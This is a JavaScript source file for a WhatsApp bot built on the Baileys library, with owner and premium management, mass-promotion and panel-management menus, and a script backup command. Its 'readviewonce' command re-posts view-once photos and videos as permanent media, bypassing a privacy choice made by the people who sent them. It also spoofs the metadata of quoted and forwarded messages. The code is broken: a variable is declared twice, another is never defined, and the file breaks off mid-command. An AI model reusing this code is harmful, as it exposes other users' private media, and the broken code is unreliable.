/*

€ Creator: Tama Ryuichi
€ Base: Tama Ryuichi
*Social Media*
 Github: https://github.com/Tama-Ryuichi
 Youtube: https://youtube.com/@tamainfinity
 Telegram: https://t.me/tamainfinity
 
<!> 
#Creator ( Tama Ryuichi )
©2024 - Tama

ini adalah base bot whatsapp simple buatanku jadi pakai aja kalau kamu tertarik.


#Developer ( Tama Ryuichi )
©2024 - Tama

This is my simple WhatsApp bot base, so feel free to use it if you're interested.

Don't Remove This Credits

*/
require('./config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const sharp = require('sharp')
const jimp = require("jimp")
const moment = require('moment-timezone')
const { exec, spawn, execSync } = require('child_process');
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('./system/exif.js')
const babi = fs.readFileSync('./system/image/Hot.jpeg')

module.exports = client = async (client, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./system/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./system/Premium.json'))
const OwnerJasher = JSON.parse(fs.readFileSync('./system/Ownj.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await client.decodeJid(client.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isOwnJasher = [botNumber, ...OwnerJasher].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await client.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

if (!client.public) {
if (!isCreator) return
}

if (command) {
  if (m.isGroup) {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  } else {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  }
}
//=================================================//
// Function Main — Menu
//=================================================//
const CHANNELS_FILE = "./system/savesaluran.json";

function loadChannels() {
    if (fs.existsSync(CHANNELS_FILE)) {
        return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));
    }
    return [];
}

function saveChannels(data) {
    fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));
}
global.channels = loadChannels();

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const imageList = [
    "https://files.catbox.moe/3x85qz.jpg"
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];

const example = (teks) => {
return `Usage: ${prefix + command} ${teks}`
}

const ReplyButton = (teks) => {
const userMode = global.menuMode || 'nobutton'; // default button

if (userMode === 'nobutton') {

client.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝗧𝗵𝗲 𝗥𝗶𝘇𝘇𝗡𝗼𝘁𝗗𝗲𝘃 🕊️`,
                body: `© RizzJpmch Botz`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: RandomMenu,
                sourceUrl: `https://whatsapp.com/channel/0029Vb6WsptHbFV1lLBD7y1B`
            }
        }
    }, { quoted: lol });
}

// BUTTON MODE
  const buttons = [
    {
      buttonId: '.menu',
      buttonText: {
        displayText: 'Menu'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: 'િ፷𝑹̶𝒊̈́͟𝒛𝒛𝑵͟𝒐̷𝒕𝑫̽͢𝒆𝒗፮▾ ༑̴⟆',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363418440295338@newsletter",
        serverMessageId: null,
        newsletterName: `🩸⃟༑⌁⃰𝐑͢𝐢𝐳𝐳 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️`
      },
      mentionedJid: ['5521992999999@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return client.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

const ReplyButtonMenu = (teks) => {
const userMode = global.menuMode || 'nobutton'; // default button

if (userMode === 'nobutton') {

client.sendMessage(m.chat, {
  image: { url: RandomMenu },
  caption: teks,
  footer: "🩸 クラッシャー\nRizxVelz Official-ID",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363418440295338@newsletter",
      serverMessageId: 1,
      newsletterName: "🩸⃟༑⌁⃰𝐑͢𝐢𝐳𝐳 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️"
    }
  }
}, { quoted: lol });
}

// BUTTON MODE
  const buttons = [
    {
      buttonId: '.allmenu',
      buttonText: {
        displayText: 'Allmenu'
    }
  },
  {
      buttonId: '.tqto',
      buttonText: {
        displayText: 'Credits'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: 'િ፷𝑹̶𝒊̈́͟𝒛𝒛𝑵͟𝒐̷𝒕𝑫̽͢𝒆𝒗፮▾ ༑̴⟆',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363418440295338@newsletter",
        serverMessageId: null,
        newsletterName: `🩸⃟༑⌁⃰𝐑͢𝐢𝐳𝐳 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️`
      },
      mentionedJid: ['5521992999999@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return client.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "",
      message: `—!s\`RizzNotDev 🎭\ncommand from: @${m.sender.split('@')[0]}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;
//=================================================//
// Command Menu
//=================================================//
switch(command) {
case 'setmenu': {
  const selected = args[0]?.toLowerCase();
  if (!['button', 'nobutton'].includes(selected)) {
    return m.reply(`*Usage :*\n.setmenu button\n.setmenu nobutton`);
  }

  global.menuMode = selected; // Ubah global, bukan per user
  return m.reply(`✅ Tampilan menu semua user telah diubah ke *${selected.toUpperCase()}* mode.`);
}
break
case 'start':
case 'help':
case 'menu': {
let Menu = `( 👋🏻 ) - Hello, ${info}!
> Select the menu display .setmenu

\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : Xipaw Official
\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}
\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
\`⭔ Runtime : ${runtime(process.uptime())}\`

╭────「 𝐌𝐞𝐧𝐮 」────╮
│▢ .jpmmenu
│▢ .ownermenu
│▢ .panelmenu
│▢ .othersmenu
│▢ .allmenu
╰────────────────╯`
ReplyButtonMenu(Menu)
}
break
case "jpmmenu": {
let Menu = `( 👋🏻 ) - Hello, ${info}!
> Select the menu display .setmenu

\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : Xipaw Official
\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}
\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
\`⭔ Runtime : ${runtime(process.uptime())}\`

-# 𝗝𝗽𝗺
 ▢ .jpm
 ▢ .jpmht
 ▢ .jpmch
 ▢ .jpmchvip
 ▢ .addidch
 ▢ .delidch
 ▢ .listidch`
ReplyButtonMenu(Menu)
}
break
case 'ownermenu': {
let Menu = `( 👋🏻 ) - Hello, ${info}!
> Select the menu display .setmenu

\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : Xipaw Official
\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}
\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
\`⭔ Runtime : ${runtime(process.uptime())}\`

-# 𝗢𝘄𝗻𝗲𝗿
 ▢ .addown
 ▢ .delown
 ▢ .listown
 ▢ .addownj
 ▢ .delownj
 ▢ .listownj
 ▢ .public
 ▢ .self
 ▢ .restart
 ▢ .hidetag
 ▢ .join
 ▢ .<
 ▢ .>
 ▢ .$`
ReplyButtonMenu(Menu)
}
break
case 'panelmenu': {
let Menu = `( 👋🏻 ) - Hello, ${info}!
> Select the menu display .setmenu

\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : Xipaw Official
\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}
\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
\`⭔ Runtime : ${runtime(process.uptime())}\`

-# 𝗣𝗮𝗻𝗲𝗹 𝗽𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹
 ▢ .cadmin
 ▢ .listadmin
 ▢ .deladmin
 ▢ .listpanel
 ▢ .delpanel
 ▢ .1-10gb
 ▢ .unli
 ▢ .cadmin2
 ▢ .listadmin2
 ▢ .deladmin2
 ▢ .listpanel2
 ▢ .delpanel2
 ▢ .1-10gb2
 ▢ .unli2`
ReplyButtonMenu(Menu)
}
break
case 'othersmenu': {
let Menu = `( 👋🏻 ) - Hello, ${info}!
> Select the menu display .setmenu

\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : Xipaw Official
\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}
\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
\`⭔ Runtime : ${runtime(process.uptime())}\`
 
-# 𝗢𝘁𝗵𝗲𝗿𝘀
 ▢ .tourl
 ▢ .cekidch
 ▢ .clearsesi
 ▢ .getsc
 ▢ .reactch`
ReplyButtonMenu(Menu)
}
break
case 'allmenu': {
let Menu = `( 👋🏻 ) - Hello, ${info}!
> Select the menu display .setmenu

\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : Xipaw Official
\`⭔\` Mode : ${client.public ? "Public Bot" : "Private Bot"}
\`⭔\` Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
\`⭔ Runtime : ${runtime(process.uptime())}\`

-# 𝗢𝘄𝗻𝗲𝗿
 ▢ .addown
 ▢ .delown
 ▢ .listown
 ▢ .addownj
 ▢ .delownj
 ▢ .listownj
 ▢ .public
 ▢ .self
 ▢ .restart
 ▢ .hidetag
 ▢ .join
 ▢ .<
 ▢ .>
 ▢ .$
 
-# 𝗝𝗽𝗺
 ▢ .jpm
 ▢ .jpmht
 ▢ .jpmslide
 ▢ .jpmch
 ▢ .jpmchvip
 ▢ .addidch
 ▢ .delidch
 ▢ .listidch
 
-# 𝗣𝗮𝗻𝗲𝗹 𝗽𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹
 ▢ .cadmin
 ▢ .listadmin
 ▢ .deladmin
 ▢ .listpanel
 ▢ .delpanel
 ▢ .1-10gb
 ▢ .unli
 ▢ .cadmin2
 ▢ .listadmin2
 ▢ .deladmin2
 ▢ .listpanel2
 ▢ .delpanel2
 ▢ .1-10gb2
 ▢ .unli2
 
-# 𝗢𝘁𝗵𝗲𝗿𝘀
 ▢ .tourl
 ▢ .cekidch
 ▢ .clearsesi
 ▢ .getsc
 ▢ .reactch
`
ReplyButtonMenu(Menu)
}
//=================================================//
// Command Owner
//=================================================//

break;

case 'addowner':
case 'addown': {
    if (!isCreator) return ReplyButton(mess.owner);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let checkNumber = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return ReplyButton("Nomor tidak valid di WhatsApp!");

    if (!owner.includes(number)) owner.push(number);
    if (!Premium.includes(number)) Premium.push(number);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
    ReplyButton(`✅ Berhasil menambahkan *@${number}* sebagai Owner`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delowner':
case 'delown': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
    ReplyButton(`❌ Owner *@${number}* berhasil dihapus.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'addpremium':
case 'addprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return ReplyButton("Nomor tidak valid!");

    if (!Premium.includes(number)) Premium.push(number);
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    ReplyButton(`✅ *@${number}* berhasil jadi user premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delpremium':
case 'delprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let index = Premium.indexOf(number);
    if (index !== -1) {
        Premium.splice(index, 1);
        fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
        ReplyButton(`❌ *@${number}* telah dihapus dari daftar premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    } else {
        ReplyButton(`⚠️ *@${number}* tidak terdaftar sebagai premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    }
}
break;
case 'listpremium':
case 'listprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (Premium.length === 0) return ReplyButton("❌ Tidak ada user premium.");
    
    let textList = `*📜 Daftar User Premium:*\n\n`;
    for (let i = 0; i < Premium.length; i++) {
        textList += `${i + 1}. wa.me/${Premium[i]}\n`;
    }

    return ReplyButton(textList);
}
break;
case 'listowner':
case 'listown': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (owner.length === 0) return ReplyButton("❌ Tidak ada data Owner.");

    let textList = `*👑 Daftar Owner Bot:*\n\n`;
    for (let i = 0; i < owner.length; i++) {
        textList += `${i + 1}. wa.me/${owner[i]}\n`;
    }

    return ReplyButton(textList);
}
break;
case 'listownj':
case 'listownjasher': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (OwnerJasher.length === 0) return ReplyButton("❌ Tidak ada user premium.");
    
    let textList = `*📜 Daftar User OwnerJasher:*\n\n`;
    for (let i = 0; i < OwnerJasher.length; i++) {
        textList += `${i + 1}. wa.me/${OwnerJasher[i]}\n`;
    }

    return ReplyButton(textList);
}
break;

case 'addownj':
case 'addownjasher': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return ReplyButton("Nomor tidak valid!");

    if (!OwnerJasher.includes(number)) OwnerJasher.push(number);
    fs.writeFileSync('./system/Ownj.json', JSON.stringify(OwnerJasher));

    ReplyButton(`✅ *@${number}* berhasil jadi user owner jasher.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delownj':
case 'delownjasher': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let index = OwnerJasher.indexOf(number);
    if (index !== -1) {
        OwnerJasher.splice(index, 1);
        fs.writeFileSync('./system/Ownj.json', JSON.stringify(OwnerJasher));
        ReplyButton(`❌ *@${number}* telah dihapus dari daftar owner jasher.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    } else {
        ReplyButton(`⚠️ *@${number}* tidak terdaftar sebagai owner jasher.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    }
}
break;
case 'public': {
    if (!isCreator) return ReplyButton(mess.owner);
    client.public = true;
    ReplyButton("Bot set to public mode.");
}
break;

case 'private': case 'self': {
    if (!isCreator) return ReplyButton(mess.owner);
    client.public = false;
    ReplyButton("Bot set to private mode.");
}
break
case "restart": {
    if (!isCreator) return ReplyButton(mess.owner);

    ReplyButton("Restarting Bot.....");

    // Delay 3 detik lalu keluar
    setTimeout(() => {
        process.exit(1);
    }, 3000);
}
break
case "backup": case "getsc": case "ambilsc": case "backupsc": {
if (!isCreator) return ReplyButton(mess.owner);
let dir = await fs.readdirSync("./system/cache")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./system/cache/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Rizz-Official-${global.versi}`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await client.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break
case "clsesi":
case "clearsesi":
case "clearsession": {
  try {
    const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
    const dirsampah = fs.readdirSync("./system/cache").filter(e => e !== "A")

    for (const file of dirsesi) {
      await fs.promises.unlink(`./session/${file}`)
    }

    for (const file of dirsampah) {
      await fs.promises.unlink(`./system/cache/${file}`)
    }

    m.reply(`*Berhasil membersihkan sampah ✅*\n` +
            `*${dirsesi.length}* sampah session\n` +
            `*${dirsampah.length}* sampah file`)
  } catch (err) {
    console.error("Gagal membersihkan sesi:", err)
    m.reply("*Terjadi kesalahan saat membersihkan sesi ❌*")
  }
}
//=================================================//
// Command Main
//=================================================//
break

case "cekidch": case "idch": {
if (!text) return ReplyButton(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return ReplyButton("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await client.newsletterMetadata("invite", result)
let teks = `${res.id}
`
return ReplyButton(teks)
}
break
case "reactch": {
 if (!text || !args[0] || !args[1]) 
 return ReplyButton(example("linkch 😐"));
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return ReplyButton("Link tautan tidak valid")
 let result = args[0].split('/')[4]
 let serverId = args[0].split('/')[5]
 let res = await client.newsletterMetadata("invite", result) 
 await client.newsletterReactMessage(res.id, serverId, args[1])
 ReplyButton(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break;

case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {
  if (!m.quoted) return ReplyButton("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return ReplyButton("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return ReplyButton("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await client.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await client.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return ReplyButton(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return ReplyButton('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return ReplyButton('Failed to download media!');
    }

    const uploadImage = require('./system/Data1');
    const uploadFile = require('./system/Data2');
